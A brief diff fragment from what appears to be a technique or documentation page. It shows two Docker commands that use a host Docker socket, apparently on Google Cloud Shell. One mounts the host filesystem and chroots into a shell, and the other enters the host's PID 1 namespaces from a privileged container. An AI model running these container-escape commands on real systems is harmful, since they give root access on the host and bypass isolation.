@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:34:34.758626+00:00'
 sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
+
+
